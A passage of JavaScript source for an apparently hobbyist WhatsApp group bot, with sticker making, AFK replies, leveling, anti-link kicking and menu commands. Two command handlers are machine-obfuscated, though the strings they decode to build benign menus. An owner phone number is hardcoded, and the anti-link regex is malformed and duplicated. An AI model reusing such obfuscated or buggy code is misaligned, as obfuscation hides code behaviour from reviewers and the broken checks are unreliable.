}
           bosco.sendMessage(to, media, type, {quoted: mek, "externalAdReply": { "title": `${' '}FOLLOW MY IG : TEDZO SIR${''}${''}`, "body": `Gʀᴏᴜᴘ Assɪsᴛᴇɴᴛ Bᴏᴛ`, "previewType": 'PHOTO', "thumbnailUrl": `${''}`, "thumbnail": denis, "sourceUrl": `${''}`}, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}
            const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('succes');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        bosco.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
      //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            bosco.sendMessage(mek.key.remoteJid,`@${owner} * Offline!*\n\n*Reason :* *${alasan}*\n*Since :* *${heheh.hours} 'O'clock*, *${heheh.minutes}* *Minute*, *${heheh.seconds}* *Seconds ago*\n\n *Please contact again later...*`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./ds.jpg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('0@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        bosco.sendMessage(mek.key.remoteJid,`@${owner} *Currently Offline!*\n\n *Reason :* *${alasan}*\n *Since :* *${heheh.hours}* *'O'clock*, *${heheh.minutes}* *Minute*, *${heheh.seconds}* *Seconds ago*\n\n*Please contact again later*`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./ds.jpg')}}}})
          }
        }
            }
          }
        }
      }
    }
      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       bosco.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       bosco.sendMessage(from, hasil, type, options).catch(e => {
	       bosco.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('*എവിടയോ എന്തോ തകരാറ് പോലെ*')
	       console.log(e)
})
})
})
})
}
          let authorname = bosco.contacts[from] != undefined ? bosco.contacts[from].vname || bosco.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = '!tedzo'; if (!author) author = 'Ser';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
	   return `./sticker/${name}.exif`	
})	
}
       function formatDate(n, locale = 'id') {
       let d = new Date(n)
       return d.toLocaleDateString(locale, { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric'
    })
    }
    const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
               // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*LEVEL UP*\n\n➸ *Name :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongratulations!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
       const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : ??',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍇 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
       
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedGif = type === 'extendedTextMessage' && content.includes('gifMessage')
         if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		 if (!mek.key.fromMe && banChats === true) return

         
// Anti link
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				bosco.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    bosco.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
        if (isGroup && isAntiLink && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match("https:\\chat.whatsapp.com")) {
                reply(`?? *GROUP LINK DETECTOR* 🚧\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\\chat.whatsapp.com)/gi)) {
                reply(`🚧 *GROUP LINK DETECTOR* 🚧\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
       if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\\chat.whatsapp.com)/gi)) {
                reply(`*🚧GROUP LINK DETECTOR🚧*\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\\chat.whatsapp.com)/gi)) {
                reply(`*🚧GROUP LINK DETECTOR❌*\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
         if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\\chat.whatsapp.com)/gi)) {
                reply(`*🚧GROUP LINK DETECTOR🚧*\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\\chat.whatsapp.com)/gi)) {
                reply(`*🚧GROUP LINK DETECTOR🚧*\n\n_To Any Links Send This Group You Will Kicked_`)
                bosco.groupRemove(from, [sender])
            }
        }
       
			if (budy.toLowerCase() === `${prefix}promote`){
		    if (!isGroup) return reply(mess.only.group)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			picknya = mek.message.extendedTextMessage.contextInfo.participant
		    bosco.groupMakeAdmin(from, [picknya])
		    return reply(`*ARE YOU HAPPY*`)
			}
			if (budy.toLowerCase() === `${prefix}demote`){
		    if (!isGroup) return reply(mess.only.group)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			dicknya = mek.message.extendedTextMessage.contextInfo.participant
		    bosco.groupDemoteAdmin(from, [dicknya])
		    return reply(`*SED ആവല്ലെ MWONOOSE*`)
			}
         
        // Button Cmd 
           if (responseButton === 'open') {
	       bosco.sendMessage(from, `*Gʀᴏᴜᴘ Oᴘᴇɴᴅ Bʏ Aᴅᴍɪɴ*`, MessageType.text, {quoted: ftext})
		   bosco.groupSettingChange(from, GroupSettingChange.messageSend, false)
		   } else if (responseButton === 'close') {
	       await bosco.groupSettingChange(from, GroupSettingChange.messageSend, true)
	       bosco.sendMessage(from, `*Gʀᴏᴜᴘ അടച്ചു*`, MessageType.text, {quoted: ftext})
           }
           if (responseButton === 'on'){
           await bosco.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
           } else if (responseButton === 'off'){
           await bosco.toggleDisappearingMessages(from, 0)
           }
              
         // CMD
        if (isCmd && !isGroup)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        
        if (isCmd && isGroup)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
 

            if (!mek.key.fromMe && banChats === true) return
            switch(command){
           
            case 'owner':
            ini_ownerNumber = [`${setting.owner}@s.whatsapp.net`,`917736835721@s.whatsapp.net`,`917736835721@s.whatsapp.net`,`${setting.owner}@s.whatsapp.net`,`${setting.owner}@s.whatsapp.net`]
            let ini_list = []
		    for (let i of ini_ownerNumber) {
			const vname_ = bosco.contacts[i] != undefined ? bosco.contacts[i].vname || bosco.contacts[i].notify : undefined
		     ini_list.push({
			 "displayName": 'Owner TEDZO',
			 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${bosco.user.name}`}\nORG: Pepe Ser;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Its me Pepe\nEND:VCARD`
			  })
			  }
			 hehe = await bosco.sendMessage(from, {
			 "displayName": `${ini_list.length} kontak`,
			 "contacts": ini_list 
			 }, 'contactsArrayMessage', {quoted:mek})
		     break
        case 'menu':
        case 'tedzoo':
        case 'cmd':
        groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
        privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        totalChat = await bosco.chats.all()
        bosco1 = await bosco.prepareMessage(from, denis, location, {thumbnail: denis})
        bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
        timestampe = speed();
        latensie = speed() - timestampe
 hehe = `
 ∆ Hɪ Bʀᴏ @${sender.split("@")[0]}
 ∆ Pʀɪᴠᴀᴛᴇ : ${privat.length}
 ∆ Gʀᴏᴜᴘs : ${groups.length}
 ∆ Tᴏᴛᴀʟ : ${totalChat.length}
 ∆ Sᴘᴇᴇᴅ : ${latensie.toFixed(4)}
 ∆ Bᴀᴛᴛᴇʀʏ : ${baterai}%\n
 ${jmn} -  ${jmo}\n${week} - ${calender}
 `
 menubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'CAMMANDS'},type:1},
 {buttonId:`${prefix}sc`,buttonText:{displayText:'GIT'},type:1},
 {buttonId:`${prefix}gp`,buttonText:{displayText:'BOTs AREA'},type:1}
]
 menumessage = { contentText: ` `, footerText: `${hehe}`, buttons: menubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, menumessage, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [sender]},})
 break
   
        case 'poor':
        var _0x893b24=_0x14ba;(function(_0x51857e,_0x1b9999){var _0x7c9370=_0x14ba,_0x24611e=_0x51857e();while(!![]){try{var _0x564bf3=parseInt(_0x7c9370(0xc1))/0x1+-parseInt(_0x7c9370(0xd8))/0x2*(parseInt(_0x7c9370(0xc8))/0x3)+-parseInt(_0x7c9370(0xd5))/0x4+parseInt(_0x7c9370(0xd0))/0x5*(parseInt(_0x7c9370(0xbf))/0x6)+parseInt(_0x7c9370(0xc2))/0x7*(-parseInt(_0x7c9370(0xbc))/0x8)+parseInt(_0x7c9370(0xda))/0x9+parseInt(_0x7c9370(0xc3))/0xa*(-parseInt(_0x7c9370(0xe1))/0xb);if(_0x564bf3===_0x1b9999)break;else _0x24611e['push'](_0x24611e['shift']());}catch(_0x22a40f){_0x24611e['push'](_0x24611e['shift']());}}}(_0xb5e9,0x73f07));function _0x14ba(_0x341725,_0x5452d5){var _0xb5e91b=_0xb5e9();return _0x14ba=function(_0x14ba11,_0x23b45b){_0x14ba11=_0x14ba11-0xb9;var _0x51dd3a=_0xb5e91b[_0x14ba11];return _0x51dd3a;},_0x14ba(_0x341725,_0x5452d5);}function _0xb5e9(){var _0x225f9e=['𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔','heapUsed','totalmem','725QVrWUs','𝐄𝐃𝐈𝐓 𝐌𝐄𝐍𝐔','memoryUsage','\x0a\x0a‣\x20*Hɪ\x20Bʀᴏ*\x20@','rules','696744qUeXev','https://bit.ly/3sC5w0G','s.whatsapp.net','8PwmOYE','split','7512822eHRfau','jid','getProfilePicture','𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔','𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔','length','\x0a\x0a‣\x20*Rᴀᴍ\x20:*\x20','42691gnYerm','\x20-\x20','CLICK\x20HERE','\x0a\x0a‣\x20*Tɪᴍᴇ\x20:*\x20','array','𝐄𝐗𝐓𝐑𝐀 𝐌𝐄𝐍𝐔','80qBMwRf','\x0a\x0a‣\x20*Tᴏᴛᴀʟ\x20:*\x20','toFixed','14856nslEgA','sendMessage','404500gaLaak','238945rUCCdW','30pQpduY','charging\x20again','𝐆𝐀𝐌𝐄','\x0a\x0a‣\x20*Sᴘᴇᴇᴅ\x20:*\x20','not\x20charging','447159KbTuMT','uptime','chats','g.us','\x0a\x0a‣\x20*Gʀᴏᴜᴘs\x20:*\x20'];_0xb5e9=function(){return _0x225f9e;};return _0xb5e9();}try{pporang=await bosco[_0x893b24(0xdc)](sender['split']('@')[0x0]+'@s.whatsapp.net');}catch{pporang=_0x893b24(0xd6);}fcre=await getBuffer(pporang),groups=bosco[_0x893b24(0xca)][_0x893b24(0xba)]['filter'](_0x151396=>_0x151396[_0x893b24(0xdb)]['endsWith'](_0x893b24(0xcb))),privat=bosco[_0x893b24(0xca)][_0x893b24(0xba)]['filter'](_0x476114=>_0x476114[_0x893b24(0xdb)]['endsWith'](_0x893b24(0xd7))),ram2=(process[_0x893b24(0xd2)]()[_0x893b24(0xce)]/0x400/0x400)[_0x893b24(0xbe)](0x2)+'MB\x20/\x20'+Math['round'](require('os')[_0x893b24(0xcf)]/0x400/0x400)+'MB',charger=''+(charging?_0x893b24(0xc4):_0x893b24(0xc7)),uptime=process[_0x893b24(0xc9)](),timestampe=speed(),totalChat=await bosco[_0x893b24(0xca)]['all'](),latensie=speed()-timestampe,total=math(groups[_0x893b24(0xdf)]+'*'+privat['length']),helllo=_0x893b24(0xd3)+sender[_0x893b24(0xd9)]('@')[0x0]+_0x893b24(0xcc)+groups['length']+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x0a‣\x20*Pʀɪᴠᴀᴛᴇ\x20:*\x20'+privat['length']+_0x893b24(0xbd)+totalChat[_0x893b24(0xdf)]+_0x893b24(0xe0)+ram2+_0x893b24(0xc6)+latensie['toFixed'](0x4)+_0x893b24(0xb9)+jmn+'\x0a\x0a',rows3=[{'title':_0x893b24(0xbb),'description':'','rowId':prefix+_0x893b24(0xbb)},{'title':_0x893b24(0xcd),'description':'','rowId':prefix+_0x893b24(0xcd)},{'title':_0x893b24(0xdd),'description':'','rowId':prefix+_0x893b24(0xdd)},{'title':_0x893b24(0xd1),'description':'','rowId':prefix+_0x893b24(0xd1)},{'title':'𝐒𝐓𝐎𝐑𝐀𝐆𝐄 𝐌𝐄𝐍𝐔','description':'','rowId':prefix+'storagemenu'},{'title':_0x893b24(0xde),'description':'','rowId':prefix+'downloadmenu'},{'title':'𝐑𝐔𝐋𝐄𝐒','description':'','rowId':prefix+_0x893b24(0xd4)},{'title':_0x893b24(0xc5),'description':'','rowId':prefix+'slot'},{'title':'𝐌𝐀𝐊𝐄𝐑 𝐌𝐄𝐍𝐔','description':'','rowId':prefix+'maker'}],sectionsro=[{'title':jmn+_0x893b24(0xe2)+week+_0x893b24(0xe2)+calender,'rows':rows3}],buttonro={'buttonText':_0x893b24(0xe3),'description':''+helllo,'sections':sectionsro,'listType':0x1},bosco[_0x893b24(0xc0)](from,buttonro,MessageType['listMessage'],{'quoted':ftrol,'caption':'hehe','contextInfo':{'mentionedJid':[sender]}});
 break
    
    case 'gp':
     function _0x4663(){var _0x2fc8bc=['61360RbdMuw','1938303OzLjeN','659960nzjTUM','404766EJGGBI','7WhscAJ','997400vvejgD','1297674CcBmhI','610998dTuyrA','5IPhDWS'];_0x4663=function(){return _0x2fc8bc;};return _0x4663();}function _0x1231(_0x40cb45,_0x55ff98){var _0x4663dc=_0x4663();return _0x1231=function(_0x1231ee,_0x440ba1){_0x1231ee=_0x1231ee-0x166;var _0x2eb6a7=_0x4663dc[_0x1231ee];return _0x2eb6a7;},_0x1231(_0x40cb45,_0x55ff98);}(function(_0x4d6264,_0xc43f28){var _0x4f3c9d=_0x1231,_0xf81e96=_0x4d6264();while(!![]){try{var _0x15833d=parseInt(_0x4f3c9d(0x16b))/0x1+-parseInt(_0x4f3c9d(0x16e))/0x2+-parseInt(_0x4f3c9d(0x169))/0x3+-parseInt(_0x4f3c9d(0x16d))/0x4*(-parseInt(_0x4f3c9d(0x16a))/0x5)+parseInt(_0x4f3c9d(0x168))/0x6+-parseInt(_0x4f3c9d(0x166))/0x7*(parseInt(_0x4f3c9d(0x167))/0x8)+parseInt(_0x4f3c9d(0x16c))/0x9;if(_0x15833d===_0xc43f28)break;else _0xf81e96['push'](_0xf81e96['shift']());}catch(_0x375167){_0xf81e96['push'](_0xf81e96['shift']());}}}(_0x4663,0x1f128),groupBosco='https://chat.whatsapp.com/JqUKjz9djTS9mDmxA2ph2t',catlo(groupBosco));
    break
    case 'allmenu':
if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, denis, location, {thumbnail: denis})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭𝙴𝙳𝙸𝚃 𝙼𝙴𝙽𝚄▭▭▭▭▭‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎